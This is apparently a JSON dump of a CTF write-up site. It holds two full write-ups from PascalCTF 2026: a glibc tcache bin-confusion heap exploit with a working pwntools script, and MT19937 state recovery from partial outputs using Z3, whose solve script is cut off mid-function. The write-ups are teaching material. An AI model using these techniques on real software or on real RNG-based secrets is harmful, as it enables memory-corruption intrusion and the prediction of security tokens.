[{"content":"","date":"8 February 2026","externalUrl":null,"permalink":"/writeups/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"8 February 2026","externalUrl":null,"permalink":"/writeups/ctfs/","section":"CTFs","summary":"","title":"CTFs","type":"ctfs"},{"content":"","date":"8 February 2026","externalUrl":null,"permalink":"/writeups/ctfs/lactf-26/","section":"CTFs","summary":"","title":"LA CTF 2026","type":"ctfs"},{"content":"I believe I\u0026rsquo;m not that good at math at this point\u0026hellip;\nnc ahc.ctf.pascalctf.it 9003 A player management system with create, delete, and print operations. The goal: overwrite a global target variable from 0xbabebabebabebabe to 0xdeadbeefcafebabe.\nProtections: Full RELRO Stack Canary NX enabled PIE enabled Full protections, so we need a heap attack.\nSetup # The binary pre-allocates 5 chunks of size 0x48 (fitting in 0x50 tcache bin), frees them all, then allocates target:\nvoid setup_chall() { for (int i = 0; i \u0026lt; 5; i++) players[i] = malloc(0x48); for (int i = 4; i \u0026gt;= 0; i--) { free(players[i]); players[i] = 0; } target = malloc(8); *target = 0xbabebabebabebabe; } After setup, the heap looks like:\n[chunk0:0x50][chunk1:0x50][chunk2:0x50][chunk3:0x50][chunk4:0x50][target:0x20][top] â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ tcache[0x50] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ The 5 freed chunks are in tcache, and target sits right after them.\nThe vulnerability # Creating a player allocates extra + 0x48 bytes, reads a name, then reads a message:\nvoid create_player() { int extra = read_int(0, 0x20); // 0-32 void *chunk = malloc(extra + 0x48); int name_len = read_name(chunk, extra); // max length: extra + 39 if (name_len \u0026lt;= extra + 0x1f) name_len = extra + 0x20; read_message(chunk + name_len); // message written at offset name_len } The bug: with extra=0, the chunk is 0x48 bytes. If we use a max-length name (39 chars), name_len becomes 40 (0x28). The message starts at offset 0x28, leaving only 0x48 - 0x28 = 0x20 (32) bytes before we overflow into the next chunk\u0026rsquo;s metadata.\nThe message can be up to 39 bytes, so we can overflow by 7 bytes into the adjacent chunk\u0026rsquo;s size field.\nThe attack # Tcache bin confusion # The idea: corrupt a chunk\u0026rsquo;s size field so when it\u0026rsquo;s freed, it goes into the wrong tcache bin. Then reallocate it as a larger chunk that overlaps with target.\nStep by step # 1. Consume tcache entries\nfor i in range(3): create(i, 0, b\u0026#39;A\u0026#39;, b\u0026#39;B\u0026#39;) Takes chunks 0-2 from tcache[0x50]:\nHeap: â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ chunk0 â”‚ chunk1 â”‚ chunk2 â”‚ chunk3 â”‚ chunk4 â”‚ target â”‚ â”‚ (used) â”‚ (used) â”‚ (used) â”‚ (free) â”‚ (free) â”‚ 0xbabe..â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€ tcache[0x50] â”€â”€â”˜ 2. Corrupt chunk4\u0026rsquo;s size\ncreate(3, 0, b\u0026#39;A\u0026#39;*39, b\u0026#39;B\u0026#39;*32 + p32(0x71)) Gets chunk3 from tcache. With a 39-byte name, message starts at offset 0x28. We write 32 \u0026lsquo;B\u0026rsquo;s (fills the remaining 0x20 bytes) plus p32(0x71) which overflows into chunk4\u0026rsquo;s header:\nchunk3 layout (0x50 total, 0x48 user data): â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ chunk3 user data â”‚ chunk4 header â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ name (39 \u0026#39;A\u0026#39;s + null) â”‚ message (32 \u0026#39;B\u0026#39;s + 0x71) â”‚prevsizeâ”‚ size â”‚ â”‚ offset 0x00 â”‚ offset 0x28 â”‚ â”‚= 0x71! â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜ overflow â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ chunk4\u0026rsquo;s size field is now 0x71 instead of 0x51.\n3. Allocate chunk4 normally\ncreate(4, 0, b\u0026#39;A\u0026#39;, b\u0026#39;B\u0026#39;) Gets chunk4 from tcache. Tcache doesn\u0026rsquo;t validate size during allocation, so this works fine.\nHeap: â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ chunk0 â”‚ chunk1 â”‚ chunk2 â”‚ chunk3 â”‚ chunk4 â”‚ target â”‚ â”‚ (used) â”‚ (used) â”‚ (used) â”‚ (used) â”‚ (used) â”‚ 0xbabe..â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ size=71!â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ tcache[0x50]: empty tcache[0x70]: empty 4. Free chunk4 into wrong bin\ndelete(4) When freeing, glibc reads the chunk\u0026rsquo;s size field to determine which bin. chunk4 has size 0x71, so it goes to tcache[0x70]:\nHeap: â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ chunk0 â”‚ chunk1 â”‚ chunk2 â”‚ chunk3 â”‚ chunk4 â”‚ target â”‚ â”‚ (used) â”‚ (used) â”‚ (used) â”‚ (used) â”‚ (free) â”‚ 0xbabe..â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ size=71 â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ tcache[0x50]: empty tcache[0x70]: chunk4 â† wrong bin! 5. Reallocate as larger chunk\ncreate(4, 32, b\u0026#39;A\u0026#39;, p64(0xdeadbeefcafebabe)*4) With extra=32, we request 32 + 0x48 = 0x68 bytes, which needs a 0x70 chunk. malloc returns chunk4 from tcache[0x70].\nThe program thinks chunk4 is 0x70 bytes, but it\u0026rsquo;s still at its original position. This \u0026ldquo;larger\u0026rdquo; view extends into target\u0026rsquo;s memory:\nWhat the program thinks chunk4 looks like: â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ chunk4 as 0x70 chunk â”‚ â”‚ (0x60 user data) â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ name (short) â”‚ message written here... â”‚ â”‚ â”‚ ...overwrites target! â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Actual memory layout: â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ real chunk4 (0x50) â”‚ target chunk (0x20) â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ user data â”‚ metadata â”‚ *target value â”‚ â”‚ â”‚ â”‚â† overwritten! â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ The message payload p64(0xdeadbeefcafebabe)*4 (32 bytes) overwrites target\u0026rsquo;s value.\n6. Win\ncheck_target() *target is now 0xdeadbeefcafebabe. Flag!\nSolve # from pwn import * context.binary = bin = ELF(\u0026#39;./average\u0026#39;, checksec=False) io = remote(\u0026#39;ahc.ctf.pascalctf.it\u0026#39;, 9003) # io = process([bin.path]) def create(idx, extra, name, msg): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;: \u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;? \u0026#39;, str(extra).encode()) io.sendlineafter(b\u0026#39;: \u0026#39;, name) io.sendlineafter(b\u0026#39;: \u0026#39;, msg) def delete(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;: \u0026#39;, str(idx).encode()) def check(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) # Consume tcache[0x50] entries for i in range(3): create(i, 0, b\u0026#39;A\u0026#39;, b\u0026#39;B\u0026#39;) # Overflow from chunk3 to corrupt chunk4\u0026#39;s size (0x51 -\u0026gt; 0x71) create(3, 0, b\u0026#39;A\u0026#39;*39, b\u0026#39;B\u0026#39;*32 + p32(0x71)) # Allocate chunk4 (corrupted size) create(4, 0, b\u0026#39;A\u0026#39;, b\u0026#39;B\u0026#39;) # Free chunk4 -\u0026gt; goes to tcache[0x70] delete(4) # Reallocate as 0x70 chunk, message overwrites target create(4, 32, b\u0026#39;A\u0026#39;, p64(0xdeadbeefcafebabe)*4) check() io.interactive() ","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/ahc/","section":"CTFs","summary":"Tcache bin confusion via chunk size corruption.","title":"AHC - Average Heap Challenge","type":"ctfs"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/chunk-size-corruption/","section":"Tags","summary":"","title":"Chunk-Size-Corruption","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/topics/crypto/","section":"Topics","summary":"Cryptography challenges, attacks, and implementations.","title":"Crypto","type":"topics"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/heap/","section":"Tags","summary":"","title":"Heap","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/mt19937/","section":"Tags","summary":"","title":"Mt19937","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/","section":"CTFs","summary":"","title":"PascalCTF 2026","type":"ctfs"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/prng/","section":"Tags","summary":"","title":"Prng","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/topics/pwn/","section":"Topics","summary":"Binary exploitation and memory corruption challenges.","title":"Pwn","type":"topics"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/smt-solver/","section":"Tags","summary":"","title":"Smt-Solver","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/tags/tcache/","section":"Tags","summary":"","title":"Tcache","type":"tags"},{"content":"","date":"1 February 2026","externalUrl":null,"permalink":"/writeups/topics/","section":"Topics","summary":"Browse writeups by category.","title":"Topics","type":"topics"},{"content":" Bored in class? Try this cryptic Wordle twist and crack the next word!\nnc wordy.ctf.pascalctf.it 5005 The challenge implements a Wordle-style game where secret words are generated by an MT19937 PRNG. To obtain the flag, we must correctly predict 5 consecutive future secrets. The twist: we only observe 20 bits of each 32-bit RNG output.\nThe attack at a high level # The core idea is simple: MT19937 is deterministic. If we can figure out its internal state, we can predict all future outputs.\nThe problem is we don\u0026rsquo;t see the full outputs. Each secret word encodes only 20 of the 32 bits the RNG produces:\ndef new_secret(): out = rng.next_u32() # 32-bit output idx = out \u0026amp; ((1 \u0026lt;\u0026lt; 20) - 1) # keep only lower 20 bits current_secret = index_to_word(idx) So we\u0026rsquo;re missing 12 bits per output. Can we still recover the state?\nYes, because MT19937\u0026rsquo;s state is heavily constrained by its structure. Even partial observations, if we collect enough of them, uniquely determine the state. We use Z3 (an SMT solver) to find a state consistent with all our observations.\nHow MT19937 works # MT19937 maintains 624 32-bit words as internal state, plus an index tracking the current position.\nGenerating output # When you call next_u32(), it:\nReads state[index] Applies a \u0026ldquo;tempering\u0026rdquo; transformation (reversible bit scrambling) Increments the index def next_u32(self): if self.index \u0026gt;= 624: self.twist() # regenerate state when exhausted y = self.mt[self.index] self.index += 1 # Tempering: reversible bit scrambling y ^= (y \u0026gt;\u0026gt; 11) y ^= ((y \u0026lt;\u0026lt; 7) \u0026amp; 0x9D2C5680) y ^= ((y \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) y ^= (y \u0026gt;\u0026gt; 18) return y The twist operation # After 624 outputs, the state is exhausted and gets regenerated via \u0026ldquo;twist\u0026rdquo;:\ndef twist(self): for i in range(624): # Combine upper bit of state[i] with lower 31 bits of state[i+1] y = (self.mt[i] \u0026amp; 0x80000000) | (self.mt[(i + 1) % 624] \u0026amp; 0x7FFFFFFF) # XOR with state[i+397] and conditional term self.mt[i] = self.mt[(i + 397) % 624] ^ (y \u0026gt;\u0026gt; 1) if y \u0026amp; 1: self.mt[i] ^= 0x9908B0DF self.index = 0 The key observation: every operation here is XOR, AND with constants, or bit shifts. No multiplication, no addition that carries between bits. This makes the entire system linear over individual bits.\nWhy partial observations are enough # Here\u0026rsquo;s the crucial insight that makes this attack work.\nTracing bits through tempering # Let\u0026rsquo;s trace exactly what happens to the bits. Say state word mt[0] has bits we\u0026rsquo;ll call b31, b30, ..., b0. The first tempering step is:\ny = mt[0] y ^= (y \u0026gt;\u0026gt; 11) What does y ^= (y \u0026gt;\u0026gt; 11) do to each bit position?\nBefore: b31 b30 b29 ... b21 b20 b19 b18 ... b11 b10 ... b0 Shifted: 0 0 0 ... 0 b31 b30 b29 ... b22 b21 ... b11 XOR: b31 b30 b29 ... b21 X X X ... X X ... X where X means \u0026#34;XOR of two bits\u0026#34; So after this step:\nBit 20 of the output = b20 XOR b31 Bit 19 of the output = b19 XOR b30 Bit 10 of the output = b10 XOR b21 Bits 21-31 are unchanged (nothing shifts into them) Each subsequent tempering step (y ^= ((y \u0026lt;\u0026lt; 7) \u0026amp; MASK), etc.) does more mixing, but it\u0026rsquo;s always XORing bits together. After all tempering steps, each output bit is the XOR of some specific subset of the original state bits.\nFrom bits to equations # Here\u0026rsquo;s where it becomes useful. Suppose after all tempering, output bit 5 equals b17 XOR b8 XOR b3 (I\u0026rsquo;m making up the exact combination, the real one depends on all the tempering steps).\nIf we observe that output bit 5 = 1, we now know:\nb17 XOR b8 XOR b3 = 1 That\u0026rsquo;s an equation! It tells us these three state bits can\u0026rsquo;t all be the same, either one is 1 and two are 0 or all three are 1.\nEach observed bit gives us one such equation. If we observe 20 bits of output, we get 20 equations constraining the state bits.\nWhy XOR makes this \u0026ldquo;linear\u0026rdquo; # XOR has a nice property: it behaves like addition where 1+1=0 (arithmetic modulo 2). This means our equations are linear, no bit is multiplied by another bit, just added (XORed) together.\nLinear systems can be solved efficiently. Given enough equations, you can solve for all unknowns using Gaussian elimination (or in our case, Z3 does something equivalent).\nIf tempering used AND or OR in ways that weren\u0026rsquo;t masked to constants, we\u0026rsquo;d get nonlinear equations like b5 AND b3 = 1, which are much harder to solve in bulk.\nCounting constraints vs unknowns # The full state is 624 Ã— 32 = 19968 bits. That\u0026rsquo;s what we need to determine.\nEach observation gives us 20 bits of output. Each bit is one linear equation constraining the state. So:\n624 observations â†’ 624 Ã— 20 = 12480 constraints (not enough) 1000 observations â†’ 1000 Ã— 20 = 20000 constraints (just enough) But raw constraint count isn\u0026rsquo;t the whole story. We also need the constraints to be independent, meaning they need to tell us different things about the state.\nWhy the twist helps # Before the twist, output \\(i\\) comes directly from state[i] (through tempering). Each observation only constrains bits of a single state word. If we only collected 624 observations from epoch 0, each state word would have 20 known bits and 12 unknown bits, with no way to pin down those 12 bits.\nAfter the twist, everything changes. Look at how twisted state is computed:\ntwisted[i] = state[(i + 397) % 624] ^ (y \u0026gt;\u0026gt; 1) ^ ... # where y combines state[i] and state[i+1] So twisted[i] depends on bits from state[i], state[i+1], AND state[(i+397) % 624]. Three different original state words get mixed together.\nWhen we observe output 624 (first output after twist), we\u0026rsquo;re constraining a linear combination of bits from multiple original state words. These cross-word constraints tie the whole state together into a connected system.\nWith observations spanning two twist boundaries (outputs 0-623, 624-1247, 1248+), we get a dense web of constraints where each state word is linked to many others. This makes the system fully determined despite only seeing 20 bits per output.\nWhy Z3 works here # Z3\u0026rsquo;s bitvector solver is essentially doing Gaussian elimination on a system of linear equations over bits. This isn\u0026rsquo;t brute force, it\u0026rsquo;s \\(O(n^3)\\) linear algebra, which is fast even for 20000 equations.\nIf MT19937 used multiplication or other nonlinear operations, Z3 would have to fall back to SAT solving, which could take exponential time. The linearity is what makes this tractable.\nSolving Wordle efficiently # Before recovering the RNG state, we need to extract the secrets. Brute-forcing all \\(16^5\\) possibilities per round is infeasible, but the Wordle feedback mechanism enables rapid narrowing.\nLetter enumeration strategy # We probe each letter by guessing 5 copies. For a guess like aaaaa against secret abcda:\nFeedback: G___G Every a in the secret shows as G (green) at its exact position This means we don\u0026rsquo;t actually need Yellow feedback at all. Greens tell us both which letters appear and where they are. After probing all 16 letters, we know every position for each letter. The remaining unknowns are just permutations of letters that could fit multiple positions.\nBatch sending # A key optimization: send all guesses at once instead of waiting for each response. With 1260 rounds of Wordle over a network connection, round-trip latency adds up fast.\n# Send all 16 letter probes in one batch guesses = [f\u0026#34;GUESS {c * 5}\u0026#34; for c in ALPHABET] io.sendline(\u0026#34;\\n\u0026#34;.join(guesses).encode()) # Then read all 16 responses for c in ALPHABET: fb = io.recvline().decode().split()[1] # process feedback... Same idea for candidate permutations: generate them all, send in one batch and read of G for each position.\nZ3-based state recovery # What is Z3? # Z3 is an SMT (Satisfiability Modulo Theories) solver, a tool that finds values satisfying a set of constraints, or proves no solution exists.\nThe key idea is symbolic computation: instead of calculating with concrete numbers, we describe operations on unknown variables and let Z3 figure out what those variables must be. This lets us \u0026ldquo;run MT19937 backwards\u0026rdquo;: we know the outputs, and Z3 finds the state that produced them.\nWhat \u0026ldquo;symbolic\u0026rdquo; actually means # When we write normal Python:\nx = 5 y = x ^ 3 # y is now 6 Python computes 5 ^ 3 = 6 immediately. The variable y holds the concrete value 6.\nZ3 works differently. When we create a Z3 variable:\nx = BitVec(\u0026#39;x\u0026#39;, 32) # \u0026#34;x is some unknown 32-bit value\u0026#34; This x isn\u0026rsquo;t a number. It\u0026rsquo;s a symbol representing \u0026ldquo;some 32-bit value we don\u0026rsquo;t know yet.\u0026rdquo; Now when we write:\ny = x ^ 3 Python doesn\u0026rsquo;t (can\u0026rsquo;t!) compute this, because x has no concrete value. Instead, Z3 overloads the ^ operator so that it builds an expression tree rather than computing a result. This is why the code looks like normal math, but Z3 has hijacked every operator to record what\u0026rsquo;s happening instead of actually doing it:\nXOR / \\ x 3 The variable y now holds this tree structure, not a number. If we keep going:\nz = y ^ 7 We get a bigger tree:\nXOR / \\ XOR 7 / \\ x 3 This is what \u0026ldquo;symbolic computation\u0026rdquo; means: instead of calculating results, we\u0026rsquo;re building up descriptions of how to calculate results, in terms of unknown variables.\nHow constraints work # Now comes the key part. When we write:\ns = Solver() s.add(z == 10) We\u0026rsquo;re telling Z3: \u0026ldquo;the expression (x ^ 3) ^ 7 must equal 10.\u0026rdquo; Z3 records this constraint. Later, when we call s.check(), Z3 works backwards: \u0026ldquo;what value of x makes this true?\u0026rdquo;\nFor this simple example: (x ^ 3) ^ 7 = 10 means x ^ 3 = 10 ^ 7 = 13, so x = 13 ^ 3 = 14.\nScaling up to MT19937 # The same principle applies to our attack. We create 624 symbolic variables:\nstate = [BitVec(f\u0026#39;mt_{i}\u0026#39;, 32) for i in range(N)] Each state[i] represents \u0026ldquo;the unknown \\(i\\)-th word of the MT19937 state.\u0026rdquo;\nThen we symbolically compute tempering:\ntempered = state[i] tempered = tempered ^ LShR(tempered, 11) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 7) \u0026amp; 0x9D2C5680) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) tempered = tempered ^ LShR(tempered, 18) After this, tempered isn\u0026rsquo;t a number. It\u0026rsquo;s an enormous expression tree with state[i] at the leaves, describing exactly how tempering transforms that state word. (Note: LShR is Z3\u0026rsquo;s logical right shift, which fills with zeros like C does for unsigned integers. Z3\u0026rsquo;s \u0026gt;\u0026gt; operator always does arithmetic shift (copies the top bit), so 0x80000000 \u0026gt;\u0026gt; 1 would give 0xC0000000 instead of 0x40000000.)\nNow we add a constraint:\ns.add(Extract(19, 0, tempered) == observations[i]) Extract(19, 0, tempered) builds another expression: \u0026ldquo;bits 0-19 of the tempered result.\u0026rdquo; Setting it equal to our observation tells Z3: \u0026ldquo;whatever state[i] is, when you temper it and take the low 20 bits, you must get this specific value.\u0026rdquo;\nEach observation adds 20 such bit-level constraints. After 1000+ observations, Z3 has enough constraints to uniquely determine all 624 state words.\nHandling the twist # For observations 624+, the output comes from twisted state. We compute this symbolically too:\nMATRIX_A = BitVecVal(0x9908B0DF, 32) # Concrete constant, not symbolic twisted = [] for i in range(N): y = (state[i] \u0026amp; 0x80000000) | (state[(i + 1) % N] \u0026amp; 0x7FFFFFFF) twisted.append(state[(i + 397) % N] ^ LShR(y, 1) ^ If((y \u0026amp; 1) == 1, MATRIX_A, BitVecVal(0, 32))) Now twisted[i] is an expression tree involving multiple original state words: state[i], state[i+1], and state[(i+397) % 624]. The If(cond, then, else) creates a conditional expression that Z3 will resolve once it knows the bit values.\nConstraints on twisted outputs therefore link multiple state words together, creating the cross-word dependencies that make the system fully determined.\nSolving # Finally:\ns.check() # Find values satisfying all constraints return [s.model()[state[i]].as_long() for i in range(N)] Z3 internally converts all our expression trees into a system of boolean equations (one per bit) and solves via something like Gaussian elimination. Because XOR is linear, this is efficient, typically under a minute for our ~25000 equations.\ns.check() # Returns sat, unsat, or unknown return [s.model()[state[i]].as_long() for i in range(N)] s.check() runs the solver. If satisfiable, s.model() returns a mapping from symbolic variables to concrete values. We extract each state word with .as_long().\nThe solver typically finishes in under a minute because the constraint system is linear over bits (XOR-based). Z3 essentially performs Gaussian elimination on ~25000 boolean equations.\nPutting it together # Collection phase # We play 1260 rounds of Wordle, recovering each secret and extracting its 20-bit index:\nobservations = [] for i in range(1260): io.sendline(b\u0026#39;NEW\u0026#39;) io.recvuntil(b\u0026#39;ROUND STARTED\u0026#39;) secret = solve_wordle(io) observations.append(word_to_index(secret)) The choice of 1260 ensures we span two twist boundaries (twists occur at outputs 624 and 1248), maximizing constraint diversity.\nRecovery and prediction phase # With all observations collected, we recover the state and create a concrete RNG instance:\nstate = recover_state(observations) rng = MT19937(state, 0) We fast-forward past all the outputs we\u0026rsquo;ve already seen:\nfor _ in range(len(observations)): rng.next_u32() Now the RNG is positioned exactly where the server\u0026rsquo;s RNG is. The next 5 outputs will match:\nfor _ in range(5): pred = rng.next_u32() \u0026amp; 0xFFFFF io.sendline(f\u0026#39;FINAL {index_to_word(pred)}\u0026#39;.encode()) Final solve script # from pwn import * from z3 import * import itertools ALPHABET = \u0026#34;abcdefghijklmnop\u0026#34; N = 624 def index_to_word(idx): word = \u0026#34;\u0026#34; for _ in range(5): word = ALPHABET[idx % 16] + word idx //= 16 return word def word_to_index(word): x = 0 for c in word: x = x * 16 + ALPHABET.index(c) return x def solve_wordle(io): known_pos = [None] * 5 counts = {} for c in ALPHABET: io.sendline(f\u0026#39;GUESS {c * 5}\u0026#39;.encode()) io.recvuntil(b\u0026#39;FEEDBACK \u0026#39;) fb = io.recvline().decode().strip() if fb == \u0026#39;_____\u0026#39;: continue g_count = fb.count(\u0026#39;G\u0026#39;) y_count = fb.count(\u0026#39;Y\u0026#39;) total = g_count + y_count if total \u0026gt; 0: counts[c] = total for i, f in enumerate(fb): if f == \u0026#39;G\u0026#39;: known_pos[i] = c if all(p is not None for p in known_pos): return \u0026#39;\u0026#39;.join(known_pos) unknown = [i for i in range(5) if known_pos[i] is None] remaining = dict(counts) for p in known_pos: if p is not None and p in remaining: remaining[p] -= 1 if remaining[p] == 0: del remaining[p] letters = [] for c, n in remaining.items(): letters += [c] * n for perm in itertools.permutations(letters, len(unknown)): candidate = list(known_pos) for i, pos in enumerate(unknown): candidate[pos] = perm[i] word = \u0026#39;\u0026#39;.join(candidate) io.sendline(f\u0026#39;GUESS {word}\u0026#39;.encode()) io.recvuntil(b\u0026#39;FEEDBACK \u0026#39;) if io.recvline().decode().strip() == \u0026#39;GGGGG\u0026#39;: return word class MT19937: def __init__(self, state, index=0): self.mt = state[:] self.index = index def twist(self): old = self.mt[:] for i in range(N): y = (old[i] \u0026amp; 0x80000000) | (old[(i + 1) % N] \u0026amp; 0x7FFFFFFF) self.mt[i] = (old[(i + 397) % N] ^ (y \u0026gt;\u0026gt; 1) ^ (0x9908B0DF if y \u0026amp; 1 else 0)) \u0026amp; 0xFFFFFFFF self.index = 0 def next_u32(self): if self.index \u0026gt;= N: self.twist() y = self.mt[self.index] self.index += 1 y ^= (y \u0026gt;\u0026gt; 11) y ^= ((y \u0026lt;\u0026lt; 7) \u0026amp; 0x9D2C5680) y ^= ((y \u0026lt;\u0026lt; 15) \u0026amp; 0xEFC60000) y ^= (y \u0026gt;\u0026gt; 18) return y \u0026amp; 0xFFFFFFFF def recover_state(observations): s = Solver() state = [BitVec(f\u0026#39;mt_{i}\u0026#39;, 32) for i in range(N)] # Epoch 0: outputs 0-623 for i in range(min(N, len(observations))): tempered = state[i] tempered = tempered ^ LShR(tempered, 11) tempered = tempered ^ ((tempered \u0026lt;\u0026lt; 7) \u0026amp; 